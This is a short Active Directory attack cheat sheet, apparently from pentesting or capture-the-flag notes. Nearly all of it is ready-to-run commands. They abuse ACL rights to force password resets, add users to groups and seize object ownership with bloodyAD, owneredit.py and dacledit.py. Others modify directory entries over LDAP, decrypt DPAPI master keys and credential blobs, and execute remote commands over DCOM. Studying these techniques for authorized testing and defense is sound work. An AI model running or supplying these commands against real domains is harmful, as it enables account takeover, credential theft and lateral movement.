


### 1. ForceChange User password using BloodyAD


If we have `ForceChangePassword` over a user, we can use bloodyAD to change their password


```bash
bloodyAD --host $IP -u 'ownedUser' -p 'password' set password 'targetuser' 'password-to-be-set'
```



### 2. Add a user to a group using BloodyAD


If we have `AddSelf` for a user or `GenericAll`, we can add them to a group using bloodyAD


```bash
bloodyAD --host $IP -d domain -u 'owneduser' -p 'password' add groupMember "GroupName" "User-to-be-added"
```




### 3. Change OwnerShip of a user  using ownerdit.py


If we have WriteOwner right over a user object, we can use `owneredit.py` to change the object ownership


```bash
owneredit.py domain/owneruser -target 'user-whose-ownership-is-to-be-changed' -action write -new-owner 'new-owner'
```





### 4. Granting GenericAll privilege to abuse ownership of a user object using dacledit.py


```bash
dacledit.py -action write -rights 'Full Control' -principal 'owneduser' -target 'targetuser' 'domain/owneduser:password'
```





### 5. Finding DN of a user with ldapsearch


```bash
ldapsearch -x -H ldap://<IP> -D "username@domain" -W -b "dc=domain,dc=com" "(sAMAccountName=<username>)"
```





### 6.  LdapModify with an LDIF file


```bash
ldapmodify -x -H ldap://<ip> -D "username@domain" -W -f <ldif_file
```





### 7. Decrypting DPAPI master key 


```bash
impacket-dpapi -master <masterkeyfile> -sid SID -password <password_of_the_user>
```




### 8. Decrypting DPAPI credential blob


```bash
impacket-dpapi -key <decrypted_master_key> -cred <encrypted_cred_blob>
```





## 9. Executing Commands Via DCOM on a remote machine


```bash
dcomexec.py domain/username:password@ip -dc-ip <ip> -M MMC20 'command'
```

